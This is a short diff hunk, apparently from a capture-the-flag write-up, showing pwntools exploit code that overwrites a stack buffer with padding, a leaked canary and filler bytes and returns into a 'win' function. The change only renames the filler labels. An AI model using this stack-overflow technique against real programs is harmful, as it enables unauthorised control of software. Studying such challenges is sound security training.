@@ -2075,7 +2075,7 @@ print(f'{s9:x}')
 print(p.recv())
 CANARY = s4
 RET_gadget = win+0x15 # just for stack alignment
-p.send( b'AAAAAAAA'*4 + p64(CANARY) + b'BBBBBBBB' + b'oldrbpxx' + p64(RET_gadget) + p64(win) )
+p.send( b'AAAAAAAA'*4 + p64(CANARY) + b'uninitil' + b'savedrdi' + p64(RET_gadget) + p64(win) )
 p.interactive()
 
 ```
